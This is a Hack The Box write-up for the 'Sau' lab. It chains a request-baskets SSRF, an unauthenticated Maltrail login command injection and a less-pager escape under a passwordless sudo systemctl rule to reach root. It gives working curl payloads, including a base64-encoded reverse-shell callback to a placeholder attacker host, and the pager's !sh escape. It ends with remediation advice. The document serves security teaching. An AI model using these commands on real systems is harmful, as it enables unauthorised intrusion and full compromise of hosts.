---
title: "Sau — SSRF Chain to Maltrail Command Injection and Pager Escape"
description: "SSRF in request-baskets (CVE-2023-27163) reaches an internal Maltrail service vulnerable to command injection, and a NOPASSWD systemctl status rule is escalated through a less-pager escape (CVE-2023-26604) to root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - ssrf
  - command-injection
  - request-baskets
  - maltrail
  - sudo
  - pager-escape
  - cve-2023-27163
  - cve-2023-26604
objective: "Chain an SSRF in request-baskets, an unauthenticated Maltrail command injection, and a passwordless systemctl pager rule into root access."
tools:
  - nmap
  - curl
  - netcat
  - python3
skill: "Multi-stage Linux exploitation chaining SSRF, command injection, and sudo pager abuse"
outcome: "Unauthenticated SSRF to internal Maltrail command injection for a user shell, escalated to root via the less pager under sudo"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Ubuntu 20.04 Linux; request-baskets 1.2.1 and Maltrail 0.53 |
| Starting position | Unauthenticated network access |
| Objective | Chain SSRF, unauthenticated command injection, and a passwordless systemctl pager rule to root |
| Outcome | User shell via Maltrail command injection; root via the `less` pager under `sudo` |

## From SSRF to Maltrail injection and pager escape

Sau is an Easy-rated Hack The Box Linux lab. An SSRF in request-baskets 1.2.1 (CVE-2023-27163) reaches a firewall-filtered internal Maltrail v0.53 service, whose login endpoint is vulnerable to unauthenticated OS command injection and returns a shell as `puma`. A passwordless `sudo` rule for `systemctl status trail.service` then reaches root through the `less` pager (CVE-2023-26604). Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **request-baskets SSRF (CVE-2023-27163) → internal Maltrail v0.53 login command injection → `puma` shell → `sudo systemctl status` `less` pager escape (CVE-2023-26604) → root**

## Ubuntu host with firewalled HTTP from unauthenticated access

- **Target:** Ubuntu 20.04 running systemd 245.
- **Exposed services:** SSH (22) and request-baskets (55555); HTTP services on ports 80 and 8338 are filtered by a host firewall.
- **Starting position:** unauthenticated network access, with only port 55555 directly reachable.
- **Objective:** reach the filtered internal services and chain their weaknesses to root.
- **Constraints:** I kept activity inside the Hack The Box lab environment.

## Evidence: request-baskets SSRF to pager escape

### 1. Service Enumeration

Observation: a full TCP scan exposes SSH and a single application port, while two standard HTTP ports are firewalled.

```bash
nmap -p- --min-rate 10000 -oA <OUT_PREFIX> <TARGET_IP>
nmap -p 22,55555 -sCV -oA <OUT_PREFIX> <TARGET_IP>
```

Truncated scan output:

```text
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
```

Port 55555 answers with `HTTP/1.0 302 Found` and a `Location: /web` redirect.

Significance: two services are present but blocked from direct external access, and the only exposed application sits on a non-standard port, so the reachable service may be able to proxy to the filtered ones.

Result: SSH and a web application on port 55555 are reachable; ports 80 and 8338 are firewalled.

### 2. Web Application Analysis: request-baskets

Observation: port 55555 serves request-baskets, an open-source webhook-capture tool. Each basket is a named endpoint that can forward received requests to a target URL and proxy the response back to the caller, and the application footer exposes the version:

```text
Powered by request-baskets | Version: 1.2.1
```

Significance: basket forwarding performs no destination validation. This is CVE-2023-27163: the basket configuration API (`POST /api/baskets/{name}`) accepts a `forward_url` that may point at loopback, link-local, or private addresses, so the server can be induced to reach services the firewall hides.

Result: request-baskets 1.2.1 is identified as an SSRF-capable forwarding service.

### 3. SSRF Exploitation: Reaching Internal Services

Observation: a basket that forwards to `127.0.0.1:80` proxies the internal service's response back through the exposed port.

Action: created a forwarding basket and queried its public URL.

```bash
curl -s -X POST http://<TARGET_IP>:55555/api/baskets/<BASKET_NAME> \
  -H "Content-Type: application/json" \
  -d '{
    "forward_url": "http://127.0.0.1:80",
    "proxy_response": true,
    "insecure_tls": false,
    "expand_path": true,
    "capacity": 250
  }'

curl -s http://<TARGET_IP>:55555/<BASKET_NAME> | grep -i "powered\|version\|maltrail"
```

The proxied response identifies the internal service:

```html
<title>Maltrail</title>
...
Powered by <b>Maltrail</b> (v0.53)
```

Significance: the server issued the request on the caller's behalf to a port the firewall blocks externally, and the response reveals the internal application.

Result: Maltrail v0.53 is reachable through the SSRF.

### 4. Maltrail v0.53: Unauthenticated Command Injection

Observation: Maltrail v0.53's login handler passes the `username` parameter to a shell command through `subprocess.check_output(..., shell=True)`, so shell metacharacters in the username are interpreted before any authentication occurs.

Action: I created a basket forwarding to the login endpoint and checked injection with a timing payload.

```bash
curl -s -X POST http://<TARGET_IP>:55555/api/baskets/<EXPLOIT_BASKET> \
  -H "Content-Type: application/json" \
  -d '{
    "forward_url": "http://127.0.0.1:80/login",
    "proxy_response": true,
    "insecure_tls": false,
    "expand_path": true,
    "capacity": 250
  }'

time curl -s -X POST http://<TARGET_IP>:55555/<EXPLOIT_BASKET> \
  -d "username=;sleep+5;"
```

The recorded result was a response delayed by more than five seconds, which matched the injected `sleep 5` and showed the parameter had reached a shell.

Significance: the pre-authentication login handler executes attacker-supplied input as an OS command in the context of the Maltrail service account, so the SSRF-reachable service becomes a code-execution primitive.

Result: unauthenticated command injection is confirmed.

### 5. Reverse Shell via Maltrail Command Injection

Observation: the injection point can run a callback command. An unencoded payload was a dead end: special characters would otherwise be mangled in the forwarded request, so the payload is base64-encoded in the request and decoded on the target before execution.

Action: started a listener and sent a base64-encoded callback through the vulnerable `username` parameter, shown as a placeholder pattern.

```bash
nc -lvnp <LISTEN_PORT>

curl -s -X POST http://<TARGET_IP>:55555/<EXPLOIT_BASKET> \
  --data-urlencode "username=;echo <ENCODED_PAYLOAD>|base64 -d|bash;"
```

The callback returns a shell as `puma`:

```text
connect to [<ATTACKER_HOST>] from (UNKNOWN) [<TARGET_IP>] <SOURCE_PORT>
$ whoami
puma
```

Significance: encoding the payload lets the injection survive the forwarded request while it still executes on the target, so command injection becomes an interactive session.

Result: the injection returns an interactive shell as `puma`, upgraded to a full TTY with `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

### 6. Sudo Enumeration

Observation: local `sudo` enumeration shows the `puma` account may run one `systemctl` command as root without a password.

```bash
sudo -l
```

```text
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Significance: `systemctl status` invokes a pager when its output exceeds the terminal height, and that pager runs with the privileges the rule grants.

Result: a passwordless, root-context `systemctl status trail.service` command is available to `puma`.

### 7. Pager Escape: CVE-2023-26604

Observation: `systemctl status` pipes its output through `less`, which supports a `!` command that spawns a shell; systemd before 247 does not set `LESSSECURE=1` to disable it, and this host runs systemd 245.

Action: ran the permitted command, then used the pager's shell escape.

```bash
sudo /usr/bin/systemctl status trail.service
```

```text
# At the pager prompt:
!sh
# Result:
uid=0(root) gid=0(root) groups=0(root)
```

The pager engages only when the output exceeds the terminal height, so a terminal sized to force pagination is required for this step.

Significance: because `systemctl` runs as root, the `less` process inherits root, and the `!sh` subshell inherits that context, so a read-only status command becomes full root execution.

Result: a root shell is obtained, confirmed by the `uid=0(root)` identity output.

## The payload breaking through basket forwarding

| Challenge | Decision | Rationale |
|---|---|---|
| Reverse-shell payload broke when forwarded through a basket | Base64-encoded the payload so it is decoded on the target before execution | Special shell characters would otherwise be mangled in the forwarded request |

## Outcome: root through the chained SSRF and pager escape

The documented chain reaches root-level control of the target from an unauthenticated start through request-baskets SSRF, Maltrail login command injection, and a `less` pager escape under a passwordless `sudo` rule. Each flaw is limited on its own: the SSRF alone cannot execute code, the injection is unreachable without it, and the sudo rule requires an existing local shell. Only the combination yields full compromise.

## Recommendations: SSRF parameters, shell input, and pager rules

These recommendations follow from the observed access paths; their effectiveness was not tested here.

1. **SSRF-sensitive URL parameters.** request-baskets accepted loopback and private destinations in `forward_url`, so an unauthenticated caller reached firewalled internal services running on the loopback interface. *Recommendation:* validate forwarding destinations server-side and block loopback (`127.0.0.0/8`), link-local (`169.254.0.0/16`), and RFC1918 ranges; the CVE-2023-27163 advisory lists no patched release, so restrict or disable basket forwarding and isolate internal services on a segmented network. Bind internal services to non-loopback interfaces behind firewall rules as defence in depth. *Detection:* log basket forwarding to private addresses and alert when those requests occur.
2. **Unsanitised input passed to a shell.** The Maltrail login handler passed the `username` parameter to a shell command via `subprocess.check_output(..., shell=True)`, so metacharacters became OS command execution before authentication. *Recommendation:* avoid the shell entirely by calling the command with `shell=False` and an argument list, and treat all HTTP input as untrusted; Maltrail 0.55 addresses this, as recorded in the project CHANGELOG. *Detection:* alert when shell metacharacters appear in the login `username` field.
3. **Privileged commands that invoke a pager.** A `NOPASSWD` rule for `systemctl status` let `less` run as root, and systemd before 247 did not set `LESSSECURE=1`, so the pager escaped to a root shell (CVE-2023-26604). *Recommendation:* keep pager-invoking commands (`systemctl`, `journalctl`, `man`, `less`) out of `NOPASSWD` sudoers rules, upgrade to systemd 247+, and route any monitoring need through a dedicated read-only account. *Validation:* review sudoers for pager commands and confirm `LESSSECURE`/`SYSTEMD_PAGERSECURE` behaviour on in-scope hosts.

## References

- [Hack The Box — Sau](https://app.hackthebox.com/machines/Sau) (retired machine)
- [NVD — CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163) (request-baskets SSRF)
- [request-baskets — darklynx/request-baskets](https://github.com/darklynx/request-baskets) (project source and `forward_url` handling)
- [GitHub Advisory — GHSA-58g2-vgpg-335q](https://github.com/advisories/GHSA-58g2-vgpg-335q) (CVE-2023-27163)
- [NVD — CVE-2023-26604](https://nvd.nist.gov/vuln/detail/CVE-2023-26604) (systemd pager privilege escalation)
- [Ubuntu Security — CVE-2023-26604](https://ubuntu.com/security/CVE-2023-26604) (vendor advisory; 20.04 LTS focal vulnerable)
- [Maltrail — stamparm/maltrail](https://github.com/stamparm/maltrail) (project source, including the login handler)
- [GitHub Advisory — GHSA-6655-8f3g-xp52](https://github.com/advisories/GHSA-6655-8f3g-xp52) (CVE-2025-34073, Maltrail <= 0.54)
- [Maltrail — CHANGELOG](https://github.com/stamparm/maltrail/blob/master/CHANGELOG) (records the login command-injection fix in 0.55, Issue #19146)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [curl — manual page](https://curl.se/docs/manpage.html)
